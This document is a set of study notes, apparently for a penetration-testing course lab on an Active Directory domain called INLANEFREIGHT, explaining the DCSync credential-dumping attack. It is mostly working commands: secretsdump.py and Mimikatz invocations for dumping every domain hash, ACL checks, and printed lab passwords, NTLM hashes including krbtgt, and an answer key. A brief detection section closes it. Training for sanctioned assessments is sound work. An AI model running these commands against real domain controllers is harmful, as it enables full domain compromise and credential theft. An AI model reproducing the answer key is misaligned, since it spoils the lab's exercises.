# Section 22 — DCSync

---

## QUICK REFERENCE

```bash
# Linux — secretsdump.py (preferred)
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# Key flags
-just-dc                    # NTLM hashes + Kerberos keys from NTDS
-just-dc-ntlm               # NTLM hashes only
-just-dc-user USERNAME      # single user — targeted, less noisy
-pwd-last-set               # include password last changed timestamp
-history                    # include password history
-user-status                # include enabled/disabled flag
-use-vss                    # fallback if DRSUAPI method fails (connection reset)
```
> Runs DCSync from Linux. Replace `adunn` and the DC IP for your target. `-just-dc` limits output to AD hashes only. If the connection resets mid-run, retry with `-use-vss` to fall back to the Volume Shadow Copy method.

```powershell
# Windows — Mimikatz (must run AS the user with DCSync rights)
runas /netonly /user:INLANEFREIGHT\adunn powershell
# In the new PS window:
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
> Runs DCSync from Windows using Mimikatz. `runas /netonly` opens a new PowerShell session that uses adunn's credentials only for network requests. `privilege::debug` must come before any `lsadump` command or it will fail.

---

## What is DCSync?

DCSync pretends to be a Domain Controller (DC) requesting password replication from another DC. It uses the **DS-Replication-Get-Changes-All** extended right. The target DC replies with every user's New Technology LAN Manager (NTLM) hash and Kerberos keys — the same data stored in NTDS.dit.

**Required rights (both needed):**
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

**Who has these by default:** Domain Admins, Enterprise Admins, and Domain Controllers.

**How attackers get here:** Through an Access Control List (ACL) abuse chain. Any non-DC account that gets replication rights — by misconfiguration or software like Exchange — can run DCSync.

---

## Lab Attack Chain (INLANEFREIGHT.LOCAL)

**Prerequisite:** `adunn` / `SyncMaster757` (obtained via targeted Kerberoasting in Section 21)

```
adunn has:
  DS-Replication-Get-Changes
  DS-Replication-Get-Changes-All
  DS-Replication-Get-Changes-In-Filtered-Set
    └─ secretsdump.py dumps all NTLM hashes + Kerberos keys
         └─ administrator hash → pass-the-hash → full domain control
         └─ krbtgt hash → Golden Ticket → persistence
         └─ reversible encryption accounts → instant cleartext
```

### Step 1 — SSH from MS01 to Linux attack host

```powershell
# From MS01 PowerShell
ssh htb-student@172.16.5.225
# password: HTB_@cademy_stdnt!
```
> SSHes from the Windows pivot host to the Linux attack host on the internal network. The DC is not directly reachable from outside — you must hop through a dual-homed host first.
- The DC (172.16.5.5) is on the internal network — not directly reachable from Kali
- MS01 is dual-homed and can reach both networks
- SSH to the Linux attack host (172.16.5.225) which has internal network access

### Step 2 — Run secretsdump as adunn

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
# password: SyncMaster757
```
> Authenticates to the DC as adunn and requests a full AD replication dump. `-outputfile` writes three files automatically (`.ntds`, `.ntds.kerberos`, `.ntds.cleartext`). Enter adunn's password at the prompt.
- `adunn` has replication rights — secretsdump uses the DRSUAPI RPC protocol to request domain replication
- `-just-dc` = only pull from NTDS (not SAM/LSA) — faster and targeted
- `-outputfile inlanefreight_hashes` = writes results to three files automatically
- If you see `Connection reset by peer` / `Try again with -use-vss parameter`, run with `-use-vss` instead

### Step 3 — Review output files

```bash
ls inlanefreight_hashes*
# inlanefreight_hashes.ntds           ← all NTLM hashes (format: domain\user:RID:lmhash:nthash:::)
# inlanefreight_hashes.ntds.kerberos  ← Kerberos keys (AES-128, AES-256, DES)
# inlanefreight_hashes.ntds.cleartext ← plaintext passwords (reversible encryption accounts only)

# Check for cleartext passwords — high value, no cracking needed
cat inlanefreight_hashes.ntds.cleartext

# Find a specific user's hash
grep khartsfield inlanefreight_hashes.ntds
```
> Lists the three output files and extracts useful data. The NT hash is the last colon-separated field before `:::`. The LM hash is always `aad3b435b51404eeaad3b435b51404ee` (blank) — ignore it. Check `.ntds.cleartext` first for instant wins.
- The `.ntds` file format is `domain\user:RID:LM_hash:NT_hash:::` — the NT hash is what you use for PtH
- LM hash is always `aad3b435b51404eeaad3b435b51404ee` = blank (LM auth disabled) — ignore it
- Cleartext file only has entries if `Store password using reversible encryption` is set on the account

### Step 4 — Windows method (Mimikatz)

```cmd
# Must run Mimikatz AS adunn — runas /netonly injects creds for network auth only
runas /netonly /user:INLANEFREIGHT\adunn powershell
# Enter password: SyncMaster757
```
> Opens a new PowerShell window where network connections authenticate as adunn. Your local session stays unchanged. `/netonly` means local commands still run as you, but any RPC/LDAP/SMB traffic uses adunn's credentials.

```powershell
# In the new PS window (running as adunn for network auth)
cd C:\Tools
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
# Output: Hash NTLM: 88ad09182de639ccc6579eb0849751cf
```
> Performs DCSync for the Administrator account. `privilege::debug` must run first. Replace `/user:` with any account you want to extract. For the highest-value targets start with `administrator` and `krbtgt`.
- `runas /netonly` = local session stays as current user, but all network connections authenticate as adunn
- `privilege::debug` = required before any Mimikatz lsadump command
- `lsadump::dcsync` = the actual DCSync — requests replication data for the target user from the DC
- Target `administrator` or `krbtgt` first — highest value hashes

---

## Verify DCSync Rights Before Attempting

```powershell
# Confirm the account actually has replication rights
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"   # adunn's SID
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {
    $_.ObjectAceType -match 'Replication-Get'
} | ? {
    $_.SecurityIdentifier -match $sid
} | select AceQualifier, ObjectAceType | fl
# Should show DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
```
> Verifies that an account actually has replication rights before attempting DCSync. Replace the SID value with the target account's SID. You need both `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` to perform a full dump.

---

## Finding Reversible Encryption Accounts

```powershell
# Native AD
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# PowerView
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```
> Finds accounts with reversible encryption enabled. UAC bit 128 means the password is stored in a recoverable form. `secretsdump` decrypts these automatically and writes them to `.ntds.cleartext` — no cracking needed.
- UAC bit 128 = `ENCRYPTED_TEXT_PWD_ALLOWED` = store password using reversible encryption
- secretsdump automatically decrypts these and outputs them in `.ntds.cleartext`
- Rare but high value — immediate plaintext, no cracking

---

## secretsdump.py Flag Reference

| Flag | Effect |
|------|--------|
| `-just-dc` | NTLM hashes + Kerberos keys (standard DCSync) |
| `-just-dc-ntlm` | NTLM hashes only — smaller output |
| `-just-dc-user USERNAME` | Single user — quieter, targeted |
| `-pwd-last-set` | Password last changed — useful for reporting |
| `-history` | Password history — useful for offline cracking |
| `-user-status` | Enabled/disabled — filter disabled from cracking stats |
| `-use-vss` | VSS shadow copy method — fallback if DRSUAPI fails |
| `-outputfile PREFIX` | Write to files with this prefix |

---

## Lab Answers

| Question | Answer |
|----------|--------|
| User with reversible encryption (besides proxyagent) | `syncron` |
| syncron's cleartext password | `Mycleart3xtP@ss!` |
| NTLM hash for khartsfield | `4bb3b317845f0954200a6b0acc9b9f9a` |

**Known hashes from this lab:**
```
administrator:  88ad09182de639ccc6579eb0849751cf
krbtgt:         16e26ba33e455a8c338142af8d89ffbc
proxyagent:     CLEARTEXT → Pr0xy_ILFREIGHT!
syncron:        CLEARTEXT → Mycleart3xtP@ss!
khartsfield:    4bb3b317845f0954200a6b0acc9b9f9a
```

---

## Detection & Mitigation

| Event ID | Meaning |
|----------|---------|
| 4662 | Operation performed on an object — replication request from non-DC = DCSync indicator |

- Non-DC machine issuing replication requests = high confidence DCSync
- Monitor for `DS-Replication-Get-Changes-All` ACE requests from workstations/servers
- Audit who has replication rights on the domain object — should only be DCs and DA-equivalent accounts

---

## Exam Notes

- DCSync = mimic DC to pull NTLM hashes for every user — full domain compromise in one command
- Need BOTH `DS-Replication-Get-Changes` AND `DS-Replication-Get-Changes-All`
- secretsdump `-just-dc` = fastest Linux path — three output files automatically
- LM hash `aad3b435b51404eeaad3b435b51404ee` = blank, always ignore it — use the NT hash
- Mimikatz `lsadump::dcsync` = Windows path — **must run in context of user with rights** via `runas /netonly`
- `-use-vss` = fallback when DRSUAPI is blocked or connection drops mid-run
- Always check `.ntds.cleartext` — reversible encryption accounts give instant plaintext
- krbtgt hash → Golden Ticket → indefinite domain persistence (covered later)
- `-just-dc-user administrator` or `krbtgt` for targeted, quieter extraction during an assessment
